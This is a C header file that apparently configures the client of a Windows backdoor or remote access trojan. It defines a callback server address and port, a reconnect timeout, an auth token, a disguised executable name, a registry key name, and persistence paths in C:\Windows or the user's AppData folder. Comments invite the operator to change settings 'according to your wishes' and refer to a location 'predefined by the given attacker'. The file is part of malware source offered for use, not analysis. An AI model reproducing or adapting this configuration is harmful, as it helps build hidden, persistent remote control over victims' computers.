
#ifndef COMMON_H
#define COMMON_H
//default header
#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "192.168.0.98" //Ip of server
#define PORT 8888 //Port of server
#define AUTO_PERSISTENCE false
#define TIMEOUT 3000//2 seconds for reconnect to server during a disconnection
#define TOKEN "|GENERATE_TOKEN|" //the token
#define NAME_PROG "12.exe" //Name of prog
#define NAME_KEY_REGISTER  "win64" 

#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
#define PATH_ADMIN "C:\\Windows" //Persistence path if the client is running admin mode.
#define PATH_NOT_ADMIN "C:\\Users\\$USER\\AppData\\Roaming" // DO NOT TOUCH

//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
// DO NOT TOUCH:

#define BUFFER_LEN 4096
#define TIMEOUT_SOCK 5 // DO NOT TOUCH 
#define SLEEP_RECV 200 // DO NOT TOUCH 
#define TIMEOUT_POPEN 7 // DO NOT TOUCH
#define SPLIT "|SPLIT|" 

#endif

/*
$USER is changed by the user who executed the program.
*/
